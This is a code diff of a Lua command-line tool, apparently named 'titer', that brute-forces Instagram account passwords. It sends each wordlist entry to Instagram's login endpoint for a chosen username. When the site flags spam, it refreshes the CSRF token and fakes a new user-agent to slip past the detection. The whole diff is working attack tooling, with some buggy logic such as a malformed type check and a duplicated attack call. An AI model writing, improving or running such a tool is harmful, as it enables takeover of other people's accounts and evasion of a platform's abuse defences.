@@ -30,6 +30,24 @@ local request_payload = [[queryParams={}&optIntoOneTap=false]]
 local csrf = nil
 local request_headers = nil
 
+local function get_csrf_token()
+	repeat
+		body,code,headers = http.request {
+			url = "https://instagram.com/accounts/login/",
+			method = "GET",
+			headers = request_headers
+		}	
+	until (type(headers == table))
+	for _,cooks in pairs(headers) do
+		if cooks:find("csrftoken") then
+			csrf = cooks:match("csrftoken=.*"):sub(11, -485)
+			break
+		end
+	end
+	return csrf
+end
+
+
 local function attack(password, proxy)
 	-- Generating fake user igent
 	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":" .. password
@@ -43,12 +61,9 @@ local function attack(password, proxy)
 		source = ltn.source.string(request_payload),
 		sink = ltn.sink.table(attack_response)
 	}
-	if proxy == "enabled" then 
-		print("proxy is enabled")
-	else
-	end
 
 	for _,resp in pairs(attack_response) do
+		print(resp)
 		return resp
 	end
 end
@@ -57,13 +72,11 @@ local function main()
     local parser = argparse() {
     	name = "titer",
     	description = titer,
-    	epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
+    	epilog = "Usage: titer -t blackarch -w wordlist.txt" 
     }
 	
     parser:option('-t --target', "Specify target instagram username")
     parser:option('-w --wordlist', "Specify wordlist file path")
-    parser:option('-p --proxy', "Enable or Disable proxyt server")
-    	:choices {"enable", "disable"}
     parser:flag('-v --version', "Get current version of soft"):action(function()
     	print("titer v1.0.0(alpha)")
     	os.exit(0)
@@ -74,43 +87,35 @@ local function main()
     end)
     local args = parser:parse()
 	
-    -- Checking if all arguments exists TODO if not args.proxy doesn't work
-	if not args.target then
-		parser:error("no target specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
-	elseif args.wordlist == nil then
-		parser:error("no wordlist file specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
-	elseif args.wordlist then
-		local words = io.open(args.wordlist)
-		if not words then
-			parser:error(args.wordlist .. " wordlist path doesn't found")
-		end
-	elseif not args.proxy then
-		parser:error("enable or disable proxy server\nExample: titer -t blackarch -w wordlist.txt -p disable")
+	-- Checking if all arguments exists TODO if not args.proxy doesn't work
+    if not args.target then
+    	parser:error("no target specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
+    elseif args.wordlist == nil then
+    	parser:error("no wordlist file specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
+    elseif args.wordlist then
+    	local words = io.open(args.wordlist)
+    	if not words then
+    		parser:error(args.wordlist .. " wordlist path doesn't found")
+    	end
 	end
-
     -- Making http request to instagram to get csrf token
     request_payload = request_payload .. "&username=" .. args.target
-    local body,code,headers = http.request {
-    	url = "https://instagram.com/accounts/login/",
-    	method = "GET",
-    	headers = request_headers,
-    }
-    for _,cooks in pairs(headers) do
-    	if cooks:find("csrftoken") then
-    		csrf = cooks:match('csrftoken=.*'):sub(11, -485)
-    		break
-    	end
-    end
     request_headers = {
     	["content-type"] = "application/x-www-form-urlencoded",
     	["X-Requested-With"] = "XMLHttpRequest",
     	["Referer"] = "http://www.instagram.com/accounts/login",
-    	["x-csrftoken"] = csrf,
-    	["User-Agent"] = fake_Agents()
     }--]]
+	request_headers["x-csrftoken"] = get_csrf_token()
     -- Checking if --wordlist exist TODO find better way with argparse
 	for pass in io.lines(args.wordlist) do
 		attack(pass, "enable")
+		if (attack(pass, "enable")):find("message") then
+			print("[-] instagram detected spam attack\n[+] generating new user-agent")
+			request_headers["User-Agent"] = fake_Agents()
+			print("[+] getting new csrf-token")
+			request_headers["x-csrftoken"] = get_csrf_token()
+			print("[+] changing proxy server")
+		end
 	end
 end
 
